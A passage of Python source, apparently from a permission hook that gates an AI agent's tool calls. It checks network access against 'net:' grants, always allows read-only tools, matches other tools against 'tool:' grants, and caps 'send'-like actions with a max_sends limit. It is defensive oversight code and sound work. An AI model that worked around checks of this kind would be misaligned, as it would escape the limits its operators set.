                      f"`tool:Skill` names no skill and grants none"), delta

    # 3. network
    if tool_name in NET_TOOLS:
        url = tool_input.get("url") or tool_input.get("query") or ""
        if tool_name == "WebSearch":
            if not net:
                return DENY, "WebSearch: no `net:` capability is granted for this run", delta
            return ALLOW, "WebSearch: `net:` granted", delta
        ok, why = net_allowed(url, net)
        return (ALLOW, f"WebFetch: {why}", delta) if ok else (DENY, f"WebFetch: {why}", delta)

    # 4. always-allowed read-only built-ins
    if tool_name in READ_ONLY_TOOLS:
        return ALLOW, f"{tool_name} is read-only", delta

    # 5. everything else — MCP tools, plugin tools, anything unrecognised
    if not tool_matches(tool_name, tools):
        granted = ", ".join(tools) or "(none)"
        return DENY, f"{tool_name} is not matched by any `tool:` grant [{granted}]", delta
    if looks_like_send(tool_name):
        ok_send, why_send, d = _spend_send(send, caps, state, what=tool_name)
        if not ok_send:
            return DENY, why_send, delta
        delta.update(d)
    return ALLOW, f"{tool_name} matched a `tool:` grant", delta


def _spend_send(send_grants, caps, state, *, what: str) -> tuple[bool, str, dict]:
    if not send_grants:
        return False, f"{what} looks like a send and no `send:` capability is granted for this run", {}
    limit = caps.get("max_sends")
    if limit is not None and state.get("sends", 0) >= limit:
        return False, f"send cap reached: max_sends={limit}", {}
    return True, "", {"sends": 1}
